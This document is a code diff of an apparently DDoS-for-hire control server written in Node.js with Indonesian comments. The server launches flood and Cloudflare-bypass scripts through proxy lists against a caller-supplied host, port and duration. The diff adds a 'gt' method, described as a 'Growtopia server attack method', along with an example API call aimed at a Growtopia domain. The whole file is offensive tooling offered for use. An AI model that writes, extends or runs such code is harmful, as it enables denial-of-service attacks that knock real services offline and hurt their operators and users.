@@ -130,6 +130,16 @@ function getCleanProxiesForTLSV2() {
     return tlsv2ProxyFile;
 }
 
+// ==================== FUNGSI KHUSUS UNTUK GT (FORMAT PROTOCOL://IP:PORT) ====================
+function getGtProxyFile() {
+    if (!fs.existsSync(PROXY_FILE)) return PROXY_FILE;
+    
+    // GT.js membutuhkan format dengan protocol (http://, socks4://, socks5://)
+    // Proxy sudah dalam format itu dari PROXY_FILE
+    console.log(`[GT] Using proxy file with protocols: ${PROXY_FILE}`);
+    return PROXY_FILE;
+}
+
 // ==================== CREATE DEFAULT UA.TXT ====================
 function createDefaultUaFile() {
     const uaFilePath = path.join(SCRIPTS_DIR, 'ua.txt');
@@ -177,7 +187,7 @@ function runWithScreen(command, method, target, duration) {
 
 // ==================== API ENDPOINT ====================
 app.get('/api', verifyApiKey, async (req, res) => {
-    let { ip, method, port, time, threads, connections, streams, fingerprint, extra, rate, browser_count, conn_timeout, rps } = req.query;
+    let { ip, method, port, time, threads, connections, streams, fingerprint, extra, rate, browser_count, conn_timeout, rps, concurrent } = req.query;
 
     if (!ip || !method || !port || !time) {
         return res.status(400).json({ error: 'Missing: ip, method, port, time required' });
@@ -192,6 +202,7 @@ app.get('/api', verifyApiKey, async (req, res) => {
     const parsedRate = rate ? parseInt(rate) : 100;
     const fingerprintEnabled = fingerprint === 'true' || fingerprint === true;
     const extraEnabled = extra === 'true' || extra === true;
+    const parsedConcurrent = concurrent ? parseInt(concurrent) : 100; // Untuk method GT
 
     const parsedBrowserCount = browser_count ? parseInt(browser_count) : 5;
     const parsedConnTimeout = conn_timeout ? parseInt(conn_timeout) : 30000;
@@ -263,17 +274,18 @@ app.get('/api', verifyApiKey, async (req, res) => {
         sessionName = runWithScreen(command, 'tlsv2', ip, parsedTime);
 
     } else if (normalizedMethod === 'cf') {
-    scriptPath = path.join(SCRIPTS_DIR, 'cf.js');
-    if (!fs.existsSync(scriptPath)) {
-        return res.status(404).json({ error: 'cf.js not found' });
-    }
-    
-    // Format yang benar: node CF-BYPASS.js <url> <time> <proxyFile>
-    command = `node ${scriptPath} ${target} ${parsedTime} ${PROXY_FILE}`;
-    console.log(`[CF] Using proxies with prefixes`);
-    
-    sessionName = runWithScreen(command, 'cf', ip, parsedTime);
-} else if (normalizedMethod === 'fast' || normalizedMethod === 'h2fast') {
+        scriptPath = path.join(SCRIPTS_DIR, 'cf.js');
+        if (!fs.existsSync(scriptPath)) {
+            return res.status(404).json({ error: 'cf.js not found' });
+        }
+        
+        // Format yang benar: node CF-BYPASS.js <url> <time> <proxyFile>
+        command = `node ${scriptPath} ${target} ${parsedTime} ${PROXY_FILE}`;
+        console.log(`[CF] Using proxies with prefixes`);
+        
+        sessionName = runWithScreen(command, 'cf', ip, parsedTime);
+
+    } else if (normalizedMethod === 'fast' || normalizedMethod === 'h2fast') {
         scriptPath = path.join(SCRIPTS_DIR, 'CF-BYPASS.js');
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'CF-BYPASS.js (H2-FAST) not found' });
@@ -318,16 +330,41 @@ app.get('/api', verifyApiKey, async (req, res) => {
         
         sessionName = runWithScreen(command, 'browser', ip, parsedTime);
 
+    // ==================== METHOD BARU: GT (GROWTOPIA) ====================
+    } else if (normalizedMethod === 'gt') {
+        scriptPath = path.join(SCRIPTS_DIR, 'gt.js');
+        if (!fs.existsSync(scriptPath)) {
+            return res.status(404).json({ error: 'gt.js not found' });
+        }
+
+        // Format: node gt.js <host> <port> <proxyFile> <concurrent> <duration>
+        // Menggunakan ip sebagai host (bisa domain atau IP)
+        const targetHost = ip; // Bisa domain seperti www.growtopia1.com atau IP
+        const targetPort = parsedPort;
+        const proxyFileForGt = getGtProxyFile(); // Proxy dengan format protocol://ip:port
+        const concurrentPerProxy = parsedConcurrent;
+        
+        command = `node ${scriptPath} ${targetHost} ${targetPort} ${proxyFileForGt} ${concurrentPerProxy} ${parsedTime}`;
+        
+        console.log(`[GT] Growtopia Attack Started`);
+        console.log(`[GT] Target: ${targetHost}:${targetPort}`);
+        console.log(`[GT] Concurrent connections per proxy: ${concurrentPerProxy}`);
+        console.log(`[GT] Duration: ${parsedTime}s`);
+        console.log(`[GT] Using proxy file with protocols (http://, socks4://, socks5://)`);
+        
+        sessionName = runWithScreen(command, 'gt', ip, parsedTime);
+
     } else {
         return res.status(400).json({
-            error: 'Unknown method. Use: tls, tlsv2, tlsv3, cf, fast, or browser',
-            available_methods: ['tls', 'tlsv2', 'tlsv3', 'cf', 'fast', 'browser']
+            error: 'Unknown method. Use: tls, tlsv2, tlsv3, cf, fast, browser, or gt',
+            available_methods: ['tls', 'tlsv2', 'tlsv3', 'cf', 'fast', 'browser', 'gt']
         });
     }
 
     console.log(`[RUN] ${normalizedMethod} | ${ip}:${parsedPort} | ${parsedTime}s | Threads: ${parsedThreads}`);
 
-    res.json({
+    // Response object berdasarkan method
+    const responseData = {
         status: 'ok',
         method: normalizedMethod,
         target: `${ip}:${parsedPort}`,
@@ -339,14 +376,26 @@ app.get('/api', verifyApiKey, async (req, res) => {
         fingerprint: fingerprintEnabled,
         extra: extraEnabled,
         screen_session: sessionName,
-        ...(normalizedMethod === 'browser' && {
-            browser_count: parsedBrowserCount,
-            conn_timeout: parsedConnTimeout,
-            rps: parsedRps
-        }),
         proxies: proxyCount,
-        proxy_type: normalizedMethod === 'tlsv2' ? 'clean (no prefixes)' : 'with prefixes'
-    });
+        proxy_type: normalizedMethod === 'tlsv2' ? 'clean (no prefixes)' : 
+                    (normalizedMethod === 'gt' ? 'with protocols (http://, socks4://, socks5://)' : 'with prefixes')
+    };
+
+    // Tambahkan parameter khusus untuk method browser
+    if (normalizedMethod === 'browser') {
+        responseData.browser_count = parsedBrowserCount;
+        responseData.conn_timeout = parsedConnTimeout;
+        responseData.rps = parsedRps;
+    }
+
+    // Tambahkan parameter khusus untuk method gt
+    if (normalizedMethod === 'gt') {
+        responseData.concurrent_per_proxy = parsedConcurrent;
+        responseData.host = ip;
+        responseData.port = parsedPort;
+    }
+
+    res.json(responseData);
 });
 
 // ==================== HEALTH CHECK ====================
@@ -358,10 +407,18 @@ app.get('/health', (req, res) => {
         proxies: proxyCount,
         ping_enabled: PING_ENABLED,
         ping_url: `https://${SERVER_DOMAIN}`,
-        available_methods: ['tls', 'tlsv2', 'tlsv3', 'cf', 'fast', 'browser'],
+        available_methods: ['tls', 'tlsv2', 'tlsv3', 'cf', 'fast', 'browser', 'gt'],
         proxy_rules: {
             tlsv2: 'Clean proxies (no http://, https://, socks4://, socks5://)',
+            gt: 'Proxies with protocols (http://, socks4://, socks5://)',
             others: 'Proxies with prefixes (as downloaded)'
+        },
+        gt_info: {
+            description: 'Growtopia server attack method',
+            script: 'gt.js',
+            target_format: 'host:port (supports domain or IP)',
+            concurrent_per_proxy: 'configurable via concurrent parameter (default: 100)',
+            proxy_format: 'Must include protocol (http://, socks4://, socks5://)'
         }
     });
 });
@@ -372,11 +429,17 @@ app.listen(PORT, () => {
     console.log(`RF-47 Network Server Started`);
     console.log(`Port: ${PORT}`);
     console.log(`API Key: ${API_KEY}`);
-    console.log(`Methods: tls, tlsv2, tlsv3, cf, fast, browser`);
+    console.log(`Methods: tls, tlsv2, tlsv3, cf, fast, browser, gt`);
     console.log(`========================================`);
     console.log(`Proxy Rules:`);
     console.log(`  - TLSV2: CLEAN proxies (without http://, https://, socks4://, socks5://)`);
+    console.log(`  - GT: Proxies WITH protocols (http://, socks4://, socks5://)`);
     console.log(`  - TLS, CF, FAST, BROWSER: Proxies WITH prefixes (as downloaded)`);
+    console.log(`========================================\n`);
+    console.log(`GT Method Info:`);
+    console.log(`  - Script: scripts/gt.js`);
+    console.log(`  - Usage: /api?api_key=KEY&method=gt&ip=HOST&port=PORT&time=DURATION&concurrent=100`);
+    console.log(`  - Example: /api?api_key=rfpromax1337&method=gt&ip=www.growtopia1.com&port=443&time=60&concurrent=50`);
     console.log(`========================================\n`);
 
     createDefaultUaFile();
